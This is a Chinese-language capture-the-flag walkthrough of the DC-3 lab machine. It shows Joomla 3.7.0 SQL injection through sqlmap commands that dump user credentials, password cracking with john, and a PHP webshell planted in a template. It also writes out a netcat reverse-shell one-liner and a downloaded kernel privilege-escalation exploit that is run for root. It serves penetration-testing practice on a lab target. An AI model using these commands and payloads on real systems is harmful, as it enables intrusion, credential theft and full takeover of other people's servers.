# DC - 3

---

# 一、信息收集

---

先使用arp-scan确定靶机的IP地址，使用命令如下

```bash
arp-scan -l
```

​![image](assets/image-20230409193420-48y66il.png)​

通过扫描结果可以得到靶机的IP为192.168.23.139，接下来使用nmap来扫描靶机开启的端口，使用命令如下

```bash
nmap -A -T 192.168.23.139
```

​![image](assets/image-20230409193703-lbm9gq5.png)​

靶机只开启了HTTP服务，使用浏览器访问靶机IP可以得到其指纹信息为joomla，使用dirsearch扫描靶机目录，使用命令如下

```bash
dirsearch -u 192.168.23.139
```

​![image](assets/image-20230409194212-y4i6qq2.png)​

通过扫描结果发现后台为/administrator，不过目前不知道靶机的登陆信息，想直接用msf来进行漏洞利用，但是这个靶机msf中的漏洞模块都不能进行直接的利用，尝试在exploitdb中搜索到了joomla相关的漏洞，使用命令如下

```bash
searchsploit joomla
```

​![image](assets/image-20230409194804-ud3ktce.png)​

得到一大堆payload，有点头大，然后搜索发现kali存在一个专门针对它的漏洞扫描工具Joomscan，使用这个工具对网站进行扫描，使用命令如下

```bash
joomscan --url 192.168.23.139
```

​![image](assets/image-20230409200252-88sf1im.png)​

# 二、漏洞利用

---

确定版本为3.7.0，使用searchsploit再次搜索相关漏洞，结果如下

​![image](assets/image-20230409200652-lpz2ob4.png)​

查看payload的路径，命令如下

```bash
searchsploit -p 42033.txt
```

​![image](assets/image-20230409201012-mgx0lv8.png)​

打开该文件查看payload的使用方法，如下

​![image](assets/image-20230409201357-qdeb59o.png)​

直接使用sqlmap进行漏洞利用，命令如下：

1、爆数据库名

```bash
sqlmap -u "http://192.168.23.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

​![image](assets/image-20230410192312-dghcpkf.png)​

得到数据库名，我们再次查询一下 joomladb数据库的表名

```bash
sqlmap -u "http://192.168.23.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
```

​![image](assets/image-20230410192430-frloyae.png)​

3、查看users表里的各个字段：

```bash
sqlmap -u "http://192.168.23.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --columns -p list[fullordering]
```

​![image](assets/image-20230410192713-a8xufgh.png)​

4、获得表中的账号密码  一般为username,password

```bash
sqlmap -u "http://192.168.23.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" -C "username,password" --dump -p list[fullordering]
```

​![image](assets/image-20230410192759-g4pd7hi.png)​

这是一个MD5+salt的加密，我们使用john去破解一下，如下

```bash
john demo.txt
```

​![image](assets/image-20230410193059-swlaj8c.png)​

得到密码 snoopy

# 三、反弹shell

---

通过对后台的各种查询，发现Extensions->Templates里面的模板可以执行PHP脚本，我们尝试写入webshell

​![image](assets/image-20230410194253-pshpc2r.png)​

​![image](assets/image-20230410195102-meha9b1.png)​

蚁剑连接成功后反弹shell，使用命令如下

```bash
nc  -lvp 4444
```

```bash
<?php 
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.23.139 4444 >/tmp/f');
?> 

```

​![image](assets/image-20230410200632-nnexbdi.png)​

​![image](assets/image-20230410200619-oknyrwc.png)​

# 四、提权

---

发现系统为Ubuntu16.04，使用searchsploit工具查找Ubuntu 16.04的提权漏洞

```bash
cat /etc/issue
```

```bash
searchsploit Ubuntu 16.04
```

​![image](assets/image-20230410200903-rsyew5h.png)​

查看相关漏洞利用的文件，得到利用poc的下载地址

```bash
cat /usr/share/exploitdb/exploits/linux/local/39772.txt
```

​![image](assets/image-20230410201103-6msdvw9.png)​

使用wget命令下载

```bash
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

如果无法下载就用浏览器下载也行，下载完成后使用蚁剑上传

​![image](assets/image-20230410202044-81nu3cx.png)​

```bash
unzip 39772.zip  #解压29772.zip文件
cd 39772
tar -xvf exploit.tar  #解压exploit提权脚本tar包
cd ebpf_mapfd_doubleput_exploit
```

​![image](assets/image-20230410202225-5fpz6pw.png)​

编译代码，编译时会出现warning，可以忽略

​![image](assets/image-20230410202316-p2cwc5q.png)​

执行代码，进行提权，获取root权限

```bash
./doubleput 
```

​![image](assets/image-20230410214920-phgfvjd.png)​

这时就已经是root权限了

​![image](assets/image-20230410214958-i6pu0fc.png)​

​![image](assets/image-20230410215023-r4x4hph.png)​
